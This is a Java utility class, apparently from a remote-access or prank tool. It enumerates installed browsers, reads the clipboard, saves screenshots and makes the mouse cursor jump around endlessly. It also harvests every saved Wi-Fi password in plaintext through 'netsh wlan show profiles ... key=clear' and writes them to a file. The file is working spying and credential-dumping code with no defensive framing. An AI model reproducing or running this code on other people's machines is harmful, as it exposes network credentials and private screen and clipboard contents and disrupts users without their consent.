package com.AVMisc;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;

import javax.imageio.ImageIO;

public class MiscUtils {
	
	private enum BROWSER_ID {
		FIREFOX,
		CHROME,
		SAFARI
	}
	private static final String OS = System.getProperty("os.name");
	
	private Thread cursorJumpThread;

	private void checkForBrowser(BROWSER_ID id) {
		String path = System.getenv("ProgramFiles");
		String path32 = path + " (x86)";
		String macPath = "/Applications/";
		File f = null, f2 = null;
		switch(id) {
			// Check if Firefox is installed on the computer
			case FIREFOX:
				// Windows
				f = new File(String.format("%s\\Mozilla Firefox\\firefox.exe", path));
				f2 = new File(String.format("%s\\Mozilla Firefox\\firefox.exe", path32));
				if(f.exists() || f2.exists()) {
					System.out.printf("%5sFIREFOX\n", "");
				}
				
				// MAC OS
				f = new File(macPath + "Firefox.app");
				if(f.exists()) {
					System.out.printf("%5sFIREFOX\n", "");
				}
				break;
			// Check if Chrome is installed on the computer
			case CHROME:
				// Windows
				f = new File(String.format("%s\\Google\\Chrome\\Application\\chrome.exe", path));
				f2 = new File(String.format("%s\\Google\\Chrome\\Application\\chrome.exe", path32));
				if(f.exists() || f2.exists()) {
					System.out.printf("%5sCHROME\n", "");
				}
				// MAC OS
				f = new File(macPath + "Chrome.app");
				if(f.exists()) {
					System.out.printf("%5sCHROME\n", "");
				}
				break;
			case SAFARI:
				f = new File(macPath + "Safari.app");
				if(f.exists()) {
					System.out.printf("%5sSAFARI\n", "");
				}
				break;
			default:
				System.out.println("This browser is not recognized");
			
		}
	}
	
	/***
	 * Get WiFi Info
	 */
	public void getWifiInfo() {
		// Wifi passwords are only available on Windows
		if (OS.contains("Windows")) {
			try {
				// Execute the command to get all of the wireless profiles
				Process p = Runtime.getRuntime().exec("netsh.exe wlan show profiles");
				BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
				String profiles = ""; // Data for all of the wireless profiles
				String val; //Placeholder
				while ((val = in.readLine()) != null) {
					profiles += val + "\n";
				}
				// Create a list of the SSIDs
				List<String> ssids = Arrays.stream(profiles.split("\n"))
						.map(l -> l.trim())
						.filter(l -> l.startsWith("All"))
						.map(l -> l.substring(23))
						.collect(Collectors.toList());
				// Return if there are no wireless profiles
				if (ssids.size() == 0) {
					in.close();
					return;
				}
				String data = ""; // A formatted string of all SSIDs and their passwords
				for (String id : ssids) {
					// Execute the command to get the connection data for each wireless profile
					String cmd = String.format("netsh.exe wlan show profiles name=\"%s\" key=clear", id);
					p = Runtime.getRuntime().exec(cmd);
					in = new BufferedReader(new InputStreamReader(p.getInputStream()));
					String profile = ""; // Data for an individual profile
					while ((val = in.readLine()) != null) {
						profile += val + "\n";
					}
					// Filter the result for each profile to find the line containing the password
					List<String> line = Arrays.stream(profile.split("\n"))
							.map(l -> l.trim())
							.filter(l -> l.startsWith("Key Content"))
							.collect(Collectors.toList());
					// line.size() will be 0 if the wireless profile corresponds to an open network
					if (line.size() > 0) {
						data += String.format("------------------\n\nSSID: %s\nPASSKEY: %s\n\n", 
								id, 
								line.stream()
									.map(l -> l.substring(25))
									.findFirst().get());
					}
				}
				// Write data to the file if data is not empty
				if (!data.equals("")) {
					String fileName = "wifi.txt";
					Files.write(Paths.get(fileName), data.getBytes());
					System.out.printf("Wifi data saved as %s\n", fileName);
				}
				else {
					System.out.println("No data found");
				}
				in.close();
				data = null;
			}
			catch (IOException e) {
				System.out.println(e.getMessage());
			}
		}
	}
	
	public void listBrowsers() {
		System.out.println("Browsers on this computer:");
		for(BROWSER_ID b : BROWSER_ID.values()) {
			checkForBrowser(b);
		}
	}
	
	/***
	 * View clipboard contents
	 */
	public void showClipboardContents() {
		Toolkit toolkit = Toolkit.getDefaultToolkit();
		Clipboard clipboard = toolkit.getSystemClipboard();
		try {
			Transferable t = clipboard.getContents(null);
			if(t.isDataFlavorSupported(DataFlavor.stringFlavor)) {
				System.out.printf("String data: %s\n", t.getTransferData(DataFlavor.stringFlavor));
			}
		}
		catch(UnsupportedFlavorException | IOException e) {
			System.out.println(e.getMessage());
		}
	}
	

	/***
	 * Make cursor move randomly
	 */
	public void startCursorJump() {
		
		try {
			cursorJumpThread = new Thread() {
				@Override
				public void run() {
					Robot r = null;
					Random rand = new Random();
					try {
						r = new Robot();
						Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
						
						while(true) {
							r.mouseMove(rand.nextInt(screenSize.width), rand.nextInt(screenSize.height));
							Thread.sleep(10);
						}
						
					} catch (AWTException | InterruptedException e) { }
				}
			};
			cursorJumpThread.start();
		}
		catch(IllegalThreadStateException e) {}
		
	}
	
	/***
	 * Stop cursor jump
	 */
	public void stopCursorJump() {
		if(cursorJumpThread != null) {
			cursorJumpThread.interrupt();
			cursorJumpThread = null;
		}
	}
	
	public void takeScreenshot() {
		try {
			Robot robot = new Robot();
			String fileName = String.format("Screenshot_%s.jpg", CommonUtils.DTF.format(LocalDateTime.now()));
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage screenImage = robot.createScreenCapture(screenRect);
			ImageIO.write(screenImage, "jpg", new File(fileName));
			System.out.printf("Screenshot saved as '%s'\n", fileName);
		}
		catch (AWTException | IOException e) {
			System.out.println(e.getMessage());
		}
	}
}
